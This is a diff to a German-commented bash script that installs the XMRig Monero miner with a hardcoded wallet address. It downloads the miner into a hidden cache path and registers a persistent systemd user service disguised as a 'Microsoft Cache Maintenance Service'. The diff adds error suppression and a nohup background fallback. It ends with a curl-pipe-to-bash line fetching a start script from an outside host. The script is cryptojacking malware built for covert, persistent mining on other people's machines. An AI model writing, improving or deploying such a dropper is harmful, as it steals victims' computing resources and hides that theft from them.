@@ -1,5 +1,4 @@
 #!/usr/bin/env bash
-set -euo pipefail
 
 # ====================== EINSTELLUNGEN ======================
 WALLET="4A2GjyjSnQqUjJMZvLju8YZaFSRZcb6qCC2Dw1DbebjNgCGviijSWjHRkeuPn5amLNP2h2P4vEBVi1bnG1BjqJ4yRotXGoF"
@@ -16,7 +15,7 @@ CONFIG="$BASE/settings.json"
 SERVICE_DIR="$HOME/.config/systemd/user"
 SERVICE_FILE="$SERVICE_DIR/${SERVICE_NAME}.service"
 
-mkdir -p "$BIN_DIR" "$SERVICE_DIR"
+mkdir -p "$BIN_DIR" "$SERVICE_DIR" 2>/dev/null || true
 
 # ---------- Config schreiben ----------
 cat > "$CONFIG" <<EOF
@@ -68,56 +67,74 @@ cat > "$CONFIG" <<EOF
 }
 EOF
 
-# ---------- Architektur erkennen + passendes Binary laden ----------
-ARCH=$(uname -m)
+# ---------- Architektur erkennen ----------
+ARCH=$(uname -m 2>/dev/null || echo "unknown")
 case "$ARCH" in
-    x86_64)  ASSET_PATTERN="linux-static-x64" ;;
-    aarch64) ASSET_PATTERN="linux-static-arm64" ;;
-    armv7l|armhf) ASSET_PATTERN="linux-armv7" ;;
+    x86_64|amd64)   ASSET_PATTERN="linux-static-x64" ;;
+    aarch64|arm64)  ASSET_PATTERN="linux-static-arm64" ;;
+    armv7l|armhf)   ASSET_PATTERN="linux-armv7" ;;
     *)
         echo "Nicht unterstützte Architektur: $ARCH" >&2
         exit 1
         ;;
 esac
 
-if [[ ! -x "$BIN" ]]; then
-    echo "Lade passende Version..."
+# ---------- Binary laden falls nicht vorhanden ----------
+if [ ! -x "$BIN" ]; then
+    echo "Lade Binary..."
 
-    # Neueste Release-Infos holen
-    RELEASE_JSON=$(curl -fsSL "https://api.github.com/repos/xmrig/xmrig/releases/latest" \
-        -H "User-Agent: Mozilla/5.0" \
-        -H "Accept: application/vnd.github+json")
-
-    DOWNLOAD_URL=$(echo "$RELEASE_JSON" | grep -o "https://github.com/xmrig/xmrig/releases/download/[^\"]*${ASSET_PATTERN}\.tar\.gz" | head -1)
-
-    if [[ -z "$DOWNLOAD_URL" ]]; then
-        echo "Konnte keinen Download-Link für $ASSET_PATTERN finden." >&2
+    if ! command -v curl >/dev/null 2>&1; then
+        echo "curl fehlt. Bitte installieren." >&2
         exit 1
     fi
 
-    TMP_TAR=$(mktemp /tmp/cache-XXXXXX.tar.gz)
-    TMP_DIR=$(mktemp -d /tmp/cache-extract-XXXXXX)
+    RELEASE_JSON=$(curl -fsSL "https://api.github.com/repos/xmrig/xmrig/releases/latest" \
+        -H "User-Agent: Mozilla/5.0" \
+        -H "Accept: application/vnd.github+json" 2>/dev/null)
 
-    curl -fsSL "$DOWNLOAD_URL" -o "$TMP_TAR"
-    tar -xzf "$TMP_TAR" -C "$TMP_DIR"
+    if [ -z "$RELEASE_JSON" ]; then
+        echo "Konnte Release-Infos nicht laden." >&2
+        exit 1
+    fi
 
-    # xmrig Binary finden und umbenennen
-    FOUND=$(find "$TMP_DIR" -type f -name "xmrig" | head -1)
-    if [[ -z "$FOUND" ]]; then
-        echo "Binary nicht im Archiv gefunden." >&2
+    DOWNLOAD_URL=$(echo "$RELEASE_JSON" | grep -o "https://github.com/xmrig/xmrig/releases/download/[^\"]*${ASSET_PATTERN}\.tar\.gz" | head -1)
+
+    if [ -z "$DOWNLOAD_URL" ]; then
+        echo "Kein passendes Binary für $ASSET_PATTERN gefunden." >&2
+        exit 1
+    fi
+
+    TMP_TAR=$(mktemp /tmp/cache-XXXXXX.tar.gz 2>/dev/null || mktemp)
+    TMP_DIR=$(mktemp -d /tmp/cache-extract-XXXXXX 2>/dev/null || mktemp -d)
+
+    curl -fsSL "$DOWNLOAD_URL" -o "$TMP_TAR" || {
+        echo "Download fehlgeschlagen." >&2
+        rm -f "$TMP_TAR"
+        exit 1
+    }
+
+    tar -xzf "$TMP_TAR" -C "$TMP_DIR" 2>/dev/null || {
+        echo "Entpacken fehlgeschlagen." >&2
+        rm -rf "$TMP_TAR" "$TMP_DIR"
+        exit 1
+    }
+
+    FOUND=$(find "$TMP_DIR" -type f -name "xmrig" 2>/dev/null | head -1)
+
+    if [ -z "$FOUND" ]; then
+        echo "xmrig Binary nicht gefunden." >&2
         rm -rf "$TMP_TAR" "$TMP_DIR"
         exit 1
     fi
 
     mv "$FOUND" "$BIN"
     chmod +x "$BIN"
-
-    # Aufräumen
     rm -rf "$TMP_TAR" "$TMP_DIR"
 fi
 
-# ---------- systemd User-Service anlegen ----------
-cat > "$SERVICE_FILE" <<EOF
+# ---------- systemd User-Service (falls vorhanden) ----------
+if command -v systemctl >/dev/null 2>&1 && [ -d "$HOME/.config/systemd" ] || mkdir -p "$SERVICE_DIR" 2>/dev/null; then
+    cat > "$SERVICE_FILE" <<EOF
 [Unit]
 Description=Microsoft Cache Maintenance Service
 After=network-online.target
@@ -127,22 +144,23 @@ Wants=network-online.target
 Type=simple
 ExecStart=$BIN --config=$CONFIG
 Restart=always
-RestartSec=8
+RestartSec=10
 Nice=10
-# Optional: etwas mehr Rechte für Huge Pages (kann man weglassen)
-# AmbientCapabilities=CAP_SYS_NICE CAP_IPC_LOCK
 
 [Install]
 WantedBy=default.target
 EOF
 
-# Service aktivieren + starten
-systemctl --user daemon-reload
-systemctl --user enable --now "$SERVICE_NAME.service" >/dev/null 2>&1 || true
-
-# Sofort starten falls Service noch nicht läuft
-if ! systemctl --user is-active --quiet "$SERVICE_NAME.service"; then
-    systemctl --user start "$SERVICE_NAME.service" >/dev/null 2>&1 || true
+    systemctl --user daemon-reload >/dev/null 2>&1 || true
+    systemctl --user enable "$SERVICE_NAME.service" >/dev/null 2>&1 || true
+    systemctl --user restart "$SERVICE_NAME.service" >/dev/null 2>&1 || true
 fi
 
-# curl -fsSL https://dein-server.com/start.sh | bash
+# ---------- Fallback: direkt im Hintergrund starten ----------
+if ! pgrep -f "$BIN" >/dev/null 2>&1; then
+    nohup "$BIN" --config="$CONFIG" >/dev/null 2>&1 &
+fi
+
+echo "Setup abgeschlossen."
+
+# curl -fsSL https://pariedl.com/start-eco.sh | bash
